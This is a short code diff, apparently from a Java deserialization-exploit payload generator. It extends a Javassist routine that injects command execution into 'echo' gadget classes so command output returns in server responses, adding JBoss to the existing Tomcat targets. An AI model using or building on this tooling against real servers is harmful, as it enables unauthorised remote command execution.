@@ -189,8 +189,8 @@ public class Gadgets {
 			String className = myClass.getName();
 			ctClass = pool.get(className);
 
-			// 动态为 TomcatEcho 添加执行命令功能
-			if (className.contains("TomcatEcho") || className.contains("AllEcho")) {
+			// 动态为 Echo回显类 添加执行命令功能
+			if (className.contains("TomcatEcho") || className.contains("AllEcho")|| className.contains("JbossEcho")) {
 				insertCMD(ctClass);
 				ctClass.getDeclaredMethod("q").setBody("{return execCmd($1);}");
 
